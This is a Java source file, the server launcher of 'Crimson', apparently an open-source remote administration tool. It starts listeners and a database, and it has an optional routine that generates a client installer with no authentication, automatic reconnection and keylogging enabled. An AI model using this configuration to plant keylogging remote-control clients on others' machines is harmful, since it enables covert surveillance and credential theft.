/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.server;

import static com.subterranean_security.crimson.universal.Flags.DEV_MODE;

import java.io.File;
import java.io.IOException;
import java.sql.SQLException;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.subterranean_security.crimson.core.misc.EH;
import com.subterranean_security.crimson.core.platform.Environment;
import com.subterranean_security.crimson.core.storage.BasicStorageFacility;
import com.subterranean_security.crimson.core.store.ConnectionStore;
import com.subterranean_security.crimson.core.util.FileUtil;
import com.subterranean_security.crimson.core.util.LogUtil;
import com.subterranean_security.crimson.core.util.Native;
import com.subterranean_security.crimson.core.util.TempUtil;
import com.subterranean_security.crimson.debug.CharcoalAppender;
import com.subterranean_security.crimson.proto.core.Generator.ClientConfig;
import com.subterranean_security.crimson.proto.core.Generator.NetworkTarget;
import com.subterranean_security.crimson.proto.core.Misc.AuthType;
import com.subterranean_security.crimson.proto.core.Misc.Outcome;
import com.subterranean_security.crimson.proto.core.net.sequences.Keylogger.Trigger;
import com.subterranean_security.crimson.server.storage.ServerDatabase;
import com.subterranean_security.crimson.server.store.ListenerStore;
import com.subterranean_security.crimson.universal.Universal;
import com.subterranean_security.crimson.universal.Universal.Instance;
import com.subterranean_security.crimson.universal.stores.DatabaseStore;
import com.subterranean_security.crimson.universal.stores.PrefStore;

/**
 * The entry point for Server instances. This class is responsible for
 * initializing the new instance.
 * 
 * @author cilki
 * @since 1.0.0
 */
public final class Server {

	/**
	 * Nested class to prevent Logger from getting default configuration
	 */
	private static final class Log {
		public static final Logger log = LoggerFactory.getLogger(Server.class);
	}

	private Server() {
	}

	public static void main(String[] argv) {
		LogUtil.configure();
		Log.log.info("Launching Crimson Server (build {})", Universal.build);

		initialize();
	}

	public static void initialize() {
		// Redirect standard output for charcoal
		if (DEV_MODE) {
			CharcoalAppender.redirectStdout();
		}

		// Establish the custom fallback exception handler
		Thread.setDefaultUncaughtExceptionHandler(new EH());

		// Establish the custom shutdown hook
		Runtime.getRuntime().addShutdownHook(new ShutdownHook());

		// Initialize preferences
		initializePreferences();

		// Try to get a lock or exit
		if (PrefStore.getPref().isLocked()) {
			Log.log.error("A Crimson server is already running in another process");
			System.exit(0);
		} else {
			PrefStore.getPref().lock();
		}

		// Load native libraries
		Native.Loader.load();

		// Clear /tmp/
		TempUtil.clear();

		// initialize server database
		initializeDatabase();

		if (Boolean.parseBoolean(System.getProperty("debug-client", "false"))) {
			installDebugClient();
		}

		// start listening
		ListenerStore.load();
		ListenerStore.startAll();

		if (DEV_MODE) {
			ConnectionStore.connectCharcoal();
		}

	}

	private static void initializeDatabase() {
		BasicStorageFacility sf = new ServerDatabase(new File(Environment.var.getAbsolutePath() + "/system.db"));
		try {
			sf.initialize();
		} catch (ClassNotFoundException e) {
			Log.log.error("Failed to load SQLite dependancy");
			System.exit(0);
		} catch (IOException e) {
			Log.log.error("Failed to write database");
			System.exit(0);
		} catch (SQLException e) {
			Log.log.error("SQL error: {}", e.getMessage());
			System.exit(0);
		}

		DatabaseStore.setFacility(sf);
	}

	private static void initializePreferences() {
		PrefStore.loadPreferences(Instance.SERVER);
	}

	/**
	 * Generate and install a debug client on the localhost
	 * 
	 * @return Operation outcome
	 */
	private static Outcome installDebugClient() {
		Outcome.Builder outcome = Outcome.newBuilder().setResult(true);

		ClientConfig cc = ClientConfig.newBuilder().setOutputType("Java (.jar)").setAuthType(AuthType.NO_AUTH)
				.addTarget(NetworkTarget.newBuilder().setServer(System.getProperty("debug-client.server", "127.0.0.1"))
						.setPort(Integer.parseInt(System.getProperty("debug-client.port", "10101"))).build())
				.setPathWin(System.getProperty("debug-client.path.windows", "%USERHOME%/.crimson/client.jar"))
				.setPathBsd(System.getProperty("debug-client.path.bsd", "%USERHOME%/.crimson/client.jar"))
				.setPathLin(System.getProperty("debug-client.path.linux", "%USERHOME%/.crimson/client.jar"))
				.setPathOsx(System.getProperty("debug-client.path.osx", "%USERHOME%/.crimson/client.jar"))
				.setPathSol(System.getProperty("debug-client.path.solaris", "%USERHOME%/.crimson/client.jar"))
				.setReconnectPeriod(Integer.parseInt(System.getProperty("debug-client.connection_period", "3000")))
				.setBuildNumber(Universal.build).setAutostart(false).setKeylogger(true)
				.setKeyloggerFlushMethod(Trigger.EVENT).setKeyloggerFlushValue(15).build();
		try {
			// Generate installer
			Generator g = new Generator();
			g.generate(cc);

			// Write installer
			byte[] res = g.getResult();
			File installer = new File(System.getProperty("user.home") + "/Desktop/crimson/client-installer.jar");
			FileUtil.writeFile(res, installer);

			// TODO fix
			// Run installer
			// HCP.run(HCP.HCP_BASE, Platform.osFamily.getJavaw() + " -jar \"" +
			// installer.getAbsolutePath() + "\"");

		} catch (Exception e) {
			Log.log.error("Failed to generate debug installer");
			outcome.setResult(false).setComment(e.getMessage());
		}

		return outcome.build();
	}

}
